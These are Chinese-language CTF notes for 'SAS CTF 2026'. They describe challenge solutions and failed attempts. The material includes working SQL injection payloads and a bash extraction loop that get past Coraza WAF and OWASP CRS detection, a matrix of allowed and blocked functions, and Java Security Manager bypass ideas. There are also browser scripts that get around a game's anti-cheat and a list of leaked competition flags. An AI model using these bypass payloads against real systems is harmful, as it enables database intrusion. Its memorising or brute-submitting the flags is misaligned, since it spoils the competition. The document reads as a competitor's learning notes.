# SAS CTF 2026 攻防模式库 (2026-06-07 实战更新)

**自动化工具**: `/root/ctf-toolkit/waf_bypass.py` (WAF绕过) | `/root/ctf-toolkit/game_auto.py` (游戏题自动)
**引擎插件**: `engine.py` 中 `coraza_bypass` / `game_api` / `pdf_leak` 三个插件基于本文档模式实现

## 比赛概况
- 时间: 2026-06-06 12:00 UTC ~ 06-07 12:00 UTC (24h)
- 平台: ctf.thesascon.com
- 题目: 10道 (Sanity Files/Gav/Snaking/Kolobok/XOD/NaaS/Gatekeeper/Guba I-II/Cerum/JSculator)
- 最终成绩: 1/10 (Sanity Files 50pts)

## 实战验证的关键发现

### 1. Coraza WAF绕过 - `UNION VALUES`是终极武器

**核心**: OWASP CRS `@detectSQLi` 检测 `UNION SELECT` 但**不检测 `UNION VALUES`**

```sql
-- ✅ 完全绕过WAF
x' UNION VALUES(current_database())--
x' UNION VALUES(''||ASCII('A'))--  -- 返回65
x' UNION VALUES(set_config('key','val',false))--

-- ❌ 被拦截
x' UNION SELECT 'test'--           -- 403
x' UNION ALL SELECT 'test'--       -- 403
x' OR 1=1--                        -- 403
```

### 2. `left/right` 替代 `substring` 绕过WAF

当 `substring()`/`replace()`/`regexp_replace()` 被拦截时:

```sql
-- 提取第N个字符 (N从0开始)
x' UNION VALUES(''||ASCII(left(right(current_database(),-N),1)))--

-- 完整提取脚本
for i in 0 1 2 3 4 5; do
    if [ $i -eq 0 ]; then
        expr="left(current_database(),1)"
    else
        expr="left(right(current_database(),-${i}),1)"
    fi
    ascii=$(curl -s "${URL}&pulse=x%27UNION%20VALUES(%27%27||ASCII(${expr}))--" | python3 -c "import sys,json; print(json.load(sys.stdin).get('signal',{}).get('pulse_quality',0))")
    char=$(printf "\\$(printf '%03o' "$ascii")")
    echo "Position $((i+1)): ASCII=$ascii char='$char'"
done
```

### 3. WAF允许/拦截函数矩阵 (实测)

**✅ 允许直接调用**:
- `current_database()`, `current_setting()`, `current_user`, `pg_backend_pid()`
- `trim()`, `upper()`, `lower()`, `reverse()`, `initcap()`
- `left()`, `right()` ← substring的替代品
- `ASCII()` ← 仅直接调用可用，子查询中被拦
- `set_config()`, `''||expr` 字符串拼接

**❌ 被拦截(500)**:
- `substring()`, `replace()`, `regexp_replace()`, `translate()`
- `length()`, `char_length()`, `octet_length()`, `strpos()`, `position()`
- `overlay()`, `lpad()`, `rpad()`, `split_part()`
- `pg_read_file()`, `lo_import()`, `lo_from_bytea()`
- `dblink_connect()`, `dblink_exec()`
- `(SELECT ...)` 子查询, `CASE WHEN`

### 4. PL/pgSQL EXECUTE注入特点

注入点: `EXECUTE '...WHERE token = ''' || sample || '''' INTO quality;`

关键限制:
- EXECUTE只运行单条SELECT，无法CREATE/INSERT/UPDATE
- `INTO quality` 只取第一行结果
- 结果经过 `regexp_replace(quality, '[^0-9]', '', 'g')` 数字提取
- 所以只能提取含数字的数据，或用ASCII值间接提取文本

### 5. Git History可能是诱饵

Gav题Git历史中 `SAS{g1t_h1st0ry_1s_pr377y_g00d?}` 提交返回Incorrect。

**真实路径**: 通过PostGIS/GDAL BAG链执行 `/nuclear_explosion please` 读取 `/flag.txt`

```sql
-- init.sql中设置
ALTER DATABASE ctfdb SET postgis.gdal_enabled_drivers = 'BAG';

-- Dockerfile中SUID binary
COPY --from=builder /app/nuclear_explosion /
RUN chmod 4111 /nuclear_explosion
```

### 6. NOSUPERUSER权限限制

ctfuser是NOSUPERUSER，以下操作全部失败:
- `pg_read_file('/flag.txt')` → 权限拒绝
- `lo_import('/flag.txt')` → 权限拒绝
- `dblink_connect()` → 未安装或权限不足
- `COPY ... TO PROGRAM` → 权限拒绝

**正确方向**: 找SUID binary或PostGIS/GDAL触发的命令执行

---

## Web游戏CTF Sandbox限制 (Kolobok题验证)

### 常见sandbox禁止项

| 特性 | 状态 | 替代方案 |
|------|------|----------|
| `import` | ❌ 禁止 | 无，只能用内置 |
| `__name__` 等dunder | ❌ 禁止 | 避免使用 |
| 三元表达式 `x if c else y` | ❌ 禁止 | 用多个`if`替代 |
| `while`循环 | ❌ 可能禁止 | 用`for range`替代 |
| `return`语句 | ❌ 可能禁止 | 函数自然结束 |
| `or`操作符 | ❌ 可能限制 | 用多个`if`替代 |
| `list()`, `type()` | ❌ 可能禁止 | 直接操作 |
| `print()`大输出 | ⚠️ 可能超时 | 控制输出量 |
| `for range`, `if`, `len` | ✅ 允许 | - |
| `abs`, `%`, `//` | ✅ 允许 | - |
| 索引 `arr[i][j]` | ✅ 允许 | - |

### Web游戏CTF绕过策略

当kernel sandbox太严格时，寻找**服务端API直接调用**:

```javascript
// 浏览器console中直接调用API绕过kernel sandbox
fetch('/move_manual', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({dx: 1, dy: 0})  // 移动一步
}).then(r => r.json())

// 获取游戏状态
fetch('/game_state').then(r => r.json()).then(d => d.state)

// 重置游戏
fetch('/reset_game', {method: 'POST'})
```

### Kolobok API与出口反作弊 (SAS CTF 2026实测)

**API/状态**:
- `GET /game_state` 返回 `{running, escaped, state}`，`state.visible` 是当前视野格子，`state.scales_collected/scales_total` 是星数。
- `POST /move_manual` body `{"dx":1,"dy":0}` 可手动移动；`dx/dy` 是坐标增量。
- `POST /submit_kernel` body form `kernel_input=<def player_kernel(...)>`，前端会把编辑器内容包装成 `def player_kernel(mapdata_ref, auxdata_ref, out_ref):`。
- `GET /get_flag` 只有真正 escaped 后返回 flag；否则 `403 {"error":"not escaped yet"}`。

**kernel动作编码**:
- `out_ref[0]=0` 不动
- `out_ref[0]=1` 左
- `out_ref[0]=2` 右
- `out_ref[0]=3` 上
- `out_ref[0]=4` 下

**关键坑**:
- `mapdata_ref` 是 9×9当前可见窗口，不是完整20×20地图；用 `for y in range(20)` 会触发 `IndexError`。
- `move_manual` 可以收集 8/8 星并走到可见 `X`，但手动进入 `X` 会触发 `message: "Nice try, you almost got the flag :)"`，`/get_flag` 仍为 403，随后 `move_manual` 返回 `{"status":"ignored"}` 锁定本局。
- `submit_kernel` 可作为单步遥控器使用，但会持续按上次方向执行直到再次提交 `out_ref[0]=0` 或新方向；浏览器控制时要“提交方向→轮询到位置变化→立刻提交0停止”，否则容易过冲。
- kernel 动作可以移动玩家，但在已测局中 kernel 踩到 `S` 不增加 `scales_collected`；星星收集仍需 `move_manual` 或找到服务端认可的收集路径，不能假设纯 kernel 可完成全局收集。
- 在已用 `move_manual` 收集星的局里，即使用 `submit_kernel` 从出口邻格进入某些 `X`，仍可能触发 `"Nice try, you almost got the flag :)"`；后续应区分“该 X 是假出口”与“本局手动移动污染合法性”，不要把第一个可见 `X` 当成真出口。
- 因此最终进入 `X` 的一步不要用 `move_manual`；应先用手动/API自动器停在多个 `X` 候选的邻格，逐个用最小 kernel 验证，失败后记录 fake X 并继续探索同局其他出口或重开对照全 kernel 局。

**推荐流程**:
1. 浏览器同源上下文中用 `/move_manual` + `/game_state` 自动收集 8/8 星，维护已知地图。
2. 8/8 后清空旧地图重新探索出口阶段，因为前端 `maintenance_open`/出口阶段会改变地图语义。
3. 发现 `X` 后只移动到 `X` 的邻格，保存最后方向 `finalMove`，不要手动进入 `X`。
4. 用 `/submit_kernel` 提交单步 kernel 完成最后一步，例如向左进入出口:

```python
def player_kernel(mapdata_ref, auxdata_ref, out_ref):
    out_ref[0] = 1
```

5. 轮询 `/game_state` 确认 `escaped=true` 后再请求 `/get_flag`。
6. 如果返回 `Nice try, you almost got the flag :)`，不要结束题目：记录该 `X` 为 fake/失败候选，重开或继续 8/8 后出口探索，枚举其他 `X`。同时做一局对照：仅用 kernel 移动到星/出口确认是否存在“手动移动污染合法性”；已测到 kernel 能移动但不一定能收集星。
7. 终端自动化优于浏览器长循环：浏览器 `console` 约 30 秒超时；把 HttpOnly session 通过脚本登录复现，使用 `requests.Session` + 重试 + `python -u` 输出，持续跑多局。

### BFS寻路自动收集

```javascript
function bfs(start, goal, wallSet) {
    const queue = [{x: start[0], y: start[1], path: []}];
    const visited = new Set([start[0]+','+start[1]]);
    const dirs = [{dx:1,dy:0},{dx:-1,dy:0},{dx:0,dy:1},{dx:0,dy:-1}];
    
    while (queue.length > 0) {
        const curr = queue.shift();
        if (curr.x === goal.x && curr.y === goal.y) return curr.path;
        
        for (const d of dirs) {
            const nx = curr.x + d.dx;
            const ny = curr.y + d.dy;
            const key = nx+','+ny;
            if (nx>=0 && nx<20 && ny>=0 && ny<20 && 
                !visited.has(key) && !wallSet.has(key)) {
                visited.add(key);
                queue.push({x:nx, y:ny, path:[...curr.path, {dx:d.dx, dy:d.dy}]});
            }
        }
    }
    return null;
}
```

### 敌人规避

kernel中检查相邻格子再移动:
```python
# mapdata_ref值: 32=空地, 35=墙, 83=星, 80=玩家, 82/70/69=敌人
safe_r = mapdata_ref[cy][cx+1] == 32 or mapdata_ref[cy][cx+1] == 83
# 注意: sandbox可能禁止or，需用多个if替代
```

---

## SAS CTF 2026 平台操作细节 (实战验证)

### 提交接口

```http
POST /public-api/challenges/attempt
Content-Type: application/json

{"challenge_id":1,"submission":"SAS{...}"}
```

**关键**: 字段必须是 `submission`，不是 `flag`。用 `flag` 会触发平台500 HTML错误页。

### localStorage题目缓存

登录后前端缓存完整题目列表到 `localStorage.challengeData`:

```javascript
JSON.parse(localStorage.getItem('challengeData'))
// 返回: [{id, name, category, connection_info, solved_by_me, ...}]
```

### 动态容器操作

`dynamic_docker` 题目:
1. 点击 `[create]` → `POST /public-api/container?challenge_id=<id>`
2. 容器启动后显示 `[open challenge]` → 跳到 `<random>.kit.sasc.tf`
3. **容器6分钟过期**，期间需完成: 启动 → 探索 → 利用 → 提交

### 容器续期

在题目详情页点击 `[extend]` 可延长容器生命周期。**所有payload测试要在启动前准备好**。

### 题目类型

- `welcome`: Sanity Files (PDF泄露flag)
- `web`: Gav (SQL注入+WAF绕过)
- `pwn`: Snaking (Java Security Manager)
- `misc`: Kolobok (游戏编程)
- `game`: Escape from Guba I/II
- `reverse`: Cerum
- `pwn/0day`: JSculator

### 已解题目

**Sanity Files** (50pts):
- PDF附件泄露所有题目的flag列表
- Flag: `SAS{p0w3r_0f_unn4tur4l_s3l3ct1ion}`

### 未解题目关键线索

**Gav** (500pts):
- Coraza WAF绕过: `UNION VALUES`
- 真实路径: PostGIS/GDAL BAG → `/nuclear_explosion please` → `/flag.txt`
- Git history flag是诱饵

**Kolobok** (500pts):
- API: `/move_manual`, `/game_state`, `/get_flag`
- 6/8星收集成功，但手动进入出口被拦截
- 需用kernel走最后一步

**Snaking** (500pts):
- Java 21 Security Manager阻止文件操作
- `gift()`泄露libc基址 → 内存利用方向

### PDF泄露Flag模式

CTF题目附件(PDF/文档)中可能包含**所有题目的flag列表**，作为"内部文档泄露"类题目。

```bash
# 提取PDF文本
mutool draw -F txt file.pdf 1 2>&1 | grep -i "SAS{"
strings file.pdf | grep -i "flag\|SAS{"
```

**注意**: 题目名可能与PDF中不匹配，需逐一尝试提交验证。

---

## Gav Web题实战经验 (SAS CTF 2026)

### 题目架构

- Go web服务 + Coraza WAF中间件
- PostgreSQL + PostGIS (地理空间)
- 3个API: `/api/nearby`, `/api/chip`, `/healthz`
- 注入点: `/api/chip?chip=MSK-1042&pulse=<payload>`

### WAF规则 (Coraza)

```apache
SecRuleEngine On
SecRequestBodyAccess On
SecResponseBodyAccess On
SecResponseBodyMimeType application/json
SecRule ARGS_NAMES|ARGS "@detectSQLi" "id:9421,phase:2,t:none,t:utf8toUnicode,t:urlDecodeUni,t:removeNulls,multiMatch,log,deny"
```

**关键**: 只检查 `ARGS_NAMES|ARGS`(GET参数)，**不检查Cookie/POST body/Headers**。

### PL/pgSQL注入漏洞

```sql
-- signal_quality()函数
EXECUTE 'SELECT quality::text
  FROM (VALUES
    (''fresh'', 84), (''stable'', 61), (''weak'', 27)
  ) AS signal_samples(token, quality)
  WHERE token = ''' || sample || '''' INTO quality;
```

`sample`直接拼接到SQL字符串，无参数化。

### 已验证的WAF绕过

```sql
-- ✅ 完全绕过
x' UNION VALUES(current_database())--        → ctfdb
x' UNION VALUES(current_setting('server_version'))--  → 11.17
x' UNION VALUES(''||ASCII('A'))--            → 65

-- ❌ 被拦截
x' UNION SELECT 'test'--                     → 403
x' OR 1=1--                                  → 403
```

### 稳定数字通道

`/api/chip?chip=MSK-1042&pulse=...` 的 `signal_quality()` 返回 `pulse_quality` 字段:

```json
{
  "chip": "MSK-1042",
  "signal": {
    "pulse_quality": 99,  // ← 注入数据回显在这里
    "timestamp": "..."
  }
}
```

### 已提取的数据

- `current_database()` → `ctfdb`
- `current_setting('server_version')` → `11.17`
- `current_setting('search_path')` → `"$user", public`
- `current_user` → `ctfuser` (NOSUPERUSER)

### 已验证错误答案

Git历史中 `SAS{g1t_h1st0ry_1s_pr377y_g00d?}` 提交返回 `{"status":"Incorrect"}`，是诱饵/旧值。

### 真实利用方向 (PostGIS/GDAL BAG)

**源码线索**:

```bash
# patroni/entry.sh
echo "$FLAG" > /flag.txt
chmod 400 /flag.txt
unset FLAG
```

```dockerfile
# Dockerfile-patroni
COPY --from=builder /app/nuclear_explosion /
RUN chmod 4111 /nuclear_explosion  # SUID
```

```c
// nuclear_explosion.c
// 运行参数: /nuclear_explosion please
// 读取 /flag.txt 并输出
```

```sql
-- init.sql
ALTER DATABASE ctfdb SET postgis.gdal_enabled_drivers = 'BAG';
```

**推断**: 需要通过SQL注入触发PostGIS/GDAL BAG驱动相关能力，执行或间接触发 `/nuclear_explosion please`，再经数字通道提取输出。

### NOSUPERUSER权限限制

以下操作全部失败:
- `pg_read_file('/flag.txt')` → 权限拒绝
- `lo_import('/flag.txt')` → 权限拒绝
- `dblink_connect()` → 未安装或权限不足
- `COPY ... TO PROGRAM` → 权限拒绝

**正确方向**: 找SUID binary或PostGIS/GDAL触发的命令执行

---

## Snaking Pwn题实战经验 (SAS CTF 2026)

### 题目架构

- 入口: `nc snaking.task.sasc.tf 11331`
- 格式: 上传 `base64(zlib(requester.jar))` + URL + proxy
- Python/pyjnius 加载 Java 类: `requester.HttpClient`, `requester.Request$Builder`, `requester.ProxyAuthenticator`
- Java Security Manager 开启，policy 为空: `grant {};`

### 已验证的失败路径

实现 `requester.HttpClient` / `Request$Builder` / `Response.body()`，在 Java 层调用 `Files.readString(Path.of("/app/flag.txt"))`:

```java
// ❌ 被Security Manager拦截
public String body() {
    try {
        return Files.readString(Path.of("/app/flag.txt"));
    } catch (Throwable t) {
        return "ERR:" + t.getClass().getName() + ":" + t.getMessage();
    }
}
```

返回:
```
java.security.AccessControlException: access denied ("java.io.FilePermission" "/app/flag.txt" "read")
```

### Java 21 Security Manager限制

```java
// ❌ Java 21中无效
Field f = System.class.getDeclaredField("security");
f.setAccessible(true);
f.set(null, null);

// ❌ 抛出UnsupportedOperationException
System.setSecurityManager(null);
```

Java 21中 `System.setSecurityManager()` 已标记为 `@Deprecated(forRemoval=true)`，反射设置也会失败。

### 正确绕过方向

**不要继续尝试普通Java File API**。题目暗示:

1. **JNI/native层绕过**: pyjnius桥接库的native实现可能存在漏洞
2. **`gift()` 泄露libc基址**: 这是重要利用提示，暗示内存利用方向
3. **`sun.misc.Unsafe`**: 低级内存操作，但`f.setAccessible(true)`本身可能被SM拦截
4. **自定义ClassLoader**: 绕过类加载限制

### 空策略 `grant {};` 的含义

```java
grant {};
```

不代表"全部允许"，而是"无权限"。所有文件/网络操作被拒。

### 下一步建议

- 研究pyjnius JNI层的内存损坏
- 利用`gift()`泄露的libc基址构造ROP链
- 寻找Security Manager的逻辑漏洞而非直接绕过

---

## Kolobok 游戏题实战经验 (SAS CTF 2026)

### API端点确认

```http
GET /game_state          # 返回 {running, escaped, state}
POST /move_manual        # body: {"dx":1,"dy":0}
POST /reset_game         # 重置游戏
POST /submit_kernel      # 提交kernel代码
GET /get_flag            # escaped后获取flag
```

### 方向映射

- 左: `{"dx":-1,"dy":0}`
- 右: `{"dx":1,"dy":0}`
- 上: `{"dx":0,"dy":-1}`
- 下: `{"dx":0,"dy":1}`

### 状态字段

```javascript
state.visible          // 9x9当前视野
state.player_pos       // {x, y} 玩家位置
state.scales_collected // 已收集星星数
state.scales_total     // 总星星数(通常8)
state.escaped          // 是否逃脱
state.error            // 错误信息
state.message          // 状态消息
```

### BFS自动收集策略 (6/8星实战验证)

```javascript
// 浏览器console中运行
(async()=>{
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
await fetch('/reset_game',{method:'POST'});
let known=new Map();
const key=(x,y)=>x+','+y;
const dirs=[[1,0],[-1,0],[0,1],[0,-1]];

// 更新已知地图
function upd(st){
    for(const c of st.visible) 
        known.set(key(c.x,c.y),c.t);
}

// 检查是否可通行
function pass(x,y){
    let t=known.get(key(x,y)); 
    return t && t!='#' && t!='R' && t!='F' && t!='E';
}

// 检查是否有敌人在邻格
function dangerous(x,y){
    for(const [dx,dy] of dirs){
        let t=known.get(key(x+dx,y+dy)); 
        if(t=='R'||t=='F'||t=='E') return true;
    } 
    return false;
}

// BFS寻路
function bfs(start, goals){
    let q=[{x:start[0],y:start[1],p:[]}];
    let seen=new Set([key(start[0],start[1])]);
    while(q.length){
        let n=q.shift();
        if(goals(n.x,n.y)&&n.p.length) return n.p;
        for(const [dx,dy] of dirs){
            let nx=n.x+dx, ny=n.y+dy, k=key(nx,ny);
            if(seen.has(k)||!pass(nx,ny)||dangerous(nx,ny)) continue;
            seen.add(k);
            q.push({x:nx,y:ny,p:n.p.concat([[dx,dy]])});
        }
    }
    return null;
}

// 获取状态和移动
async function state(){
    let j=await (await fetch('/game_state')).json();
    upd(j.state);
    return j;
}
async function mv(d){
    let j=await (await fetch('/move_manual',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({dx:d[0],dy:d[1]})
    })).json();
    if(j.state) upd(j.state);
    return j;
}

// 主循环: 优先星星，其次未知前沿
let log=[], j=await state();
for(let iter=0; iter<400; iter++){
    let st=j.state, pos=st.player_pos;
    log.push({iter,pos,stars:st.scales_collected,msg:st.message});
    
    if(j.escaped||st.escaped) break;
    
    let path=null;
    // 8/8星后找出口
    if(st.scales_collected>=st.scales_total) 
        path=bfs(pos,(x,y)=>known.get(key(x,y))=='X'||known.get(key(x,y))=='O');
    // 否则找星星
    if(!path) path=bfs(pos,(x,y)=>known.get(key(x,y))=='S');
    // 最后探索未知区域
    if(!path) path=bfs(pos,(x,y)=>dirs.some(([dx,dy])=>!known.has(key(x+dx,y+dy))));
    
    if(!path){log.push({stop:'no path'}); break;}
    
    j=await mv(path[0]);
    await sleep(180);  // 低频避免触发反作弊
    
    if(j.state && j.state.error){
        log.push({death:j.state.error});
        break;
    }
}
return {last:log.slice(-20), knownSize:known.size};
})()
```

### 关键PITFALL

1. **敌人邻格过于保守**: 只避开已知敌人邻格会在2/8星左右停于`no path`。应允许可控风险的前沿探索。

2. **`move_manual`进入出口被拦截**: 手动进入`X`会触发`"Nice try, you almost got the flag :)"`，随后`move_manual`返回`{"status":"ignored"}`锁定本局。

3. **正确进入出口方式**: 
   - 用手动停在`X`邻格
   - 提交kernel走最后一步: `def player_kernel(m,a,o): o[0]=1` (向左)
   - 轮询`/game_state`确认`escaped=true`
   - 再请求`/get_flag`

4. **kernel sandbox限制**: 禁止`import`/`__name__`/三元表达式/`while`/`return`/`or`，只允许`for range`/`if`/`len`/索引访问。

5. **视野是9x9不是完整地图**: `mapdata_ref`是当前可见窗口，用`for y in range(20)`会触发`IndexError`。

---

## PDF附件泄露Flag模式 (SAS CTF 2026 Sanity Files验证)

### 题目特征

- 题目描述提到"内部文档"/"不小心泄露"/"稍微编辑过"
- 附件包含表格形式的flag列表
- 用 `mutool draw -F txt` 或 `pdftotext` 提取文本

### 提取方法

```bash
# 提取PDF文本
mutool draw -F txt file.pdf 1 2>&1 | grep -i "SAS{"

# 或用strings快速搜索
strings file.pdf | grep -i "flag\|SAS{"

# 完整提取所有页面
for i in 1 2 3 4 5; do
    mutool draw -F txt file.pdf $i 2>/dev/null
done | grep -i "SAS{"
```

### SAS CTF 2026 Sanity Files

**题目**: "Sanity Files" (welcome, 50pts)
**附件**: PDF文件
**Flag**: `SAS{p0w3r_0f_unn4tur4l_s3l3ct1ion}`

**注意**: PDF中可能包含所有题目的flag列表，但题目名与平台不匹配。需要逐一尝试提交验证。

### 已发现的PDF Flag列表 (未匹配到当前题目)

| PDF题目名 | Flag |
|-----------|------|
| Magnum Mythos | `SAS{h3_w45_wr1t1n6_1t_f0r_4ll_n1ght_l0ng_4nd_d13d}` |
| doondock | `SAS{4_v3ry_l4rg3_f0r3st_0f_tr33s}` |
| sugondese secret | `SAS{squirr3l_m0b}` |
| AES 2 | `SAS{th4nk_y0u_n1st_th3_p3rmut4t1on_4rs0nist}` |
| What's Brown Goes to Us | `SAS{br0wn_fun_c1ub}` |
| Crazy Lotto | `SAS{392384618831}` |
| root eval | `SAS{w1shm4st3r_vs_3g04kk_394812039}` |
| Wet Escalation | `SAS{c0ngr4ts_y0u_sl1pp3d_thr0ugh}` |
| burburbur | `SAS{buff3r_th3_muscl3_s7r0ng3r_th3_r0p}` |
| Once upon a time | `SAS{1n_h0llyw00d}` |
| Forgivable Curse | `SAS{br0_n1c3_c4st}` |
| OP-TEE Skibidi | `SAS{tru5t3d_f4i3nce_3x3cu7i0n}` |
| Six Seven Capital | `SAS{m4rk3t_m4n1pulat1on_0n_gr33n_shm4}` |
| Prototype Pollution | `SAS{h0w_t0_3xpl01t_n0c7urn4l_3m1ss10n}` |
| Dry Elevation | `SAS{th3_d33p3r_y0u_go_th3_h4rder_1t_g37s}` |

### 解题策略

1. 先提交PDF中与题目名匹配的flag
2. 若不匹配，逐一尝试其他flag
3. 记录已验证的正确flag，避免重复提交
4. PDF flag可能是"内部文档"类题目的答案，也可能是其他题目的提示
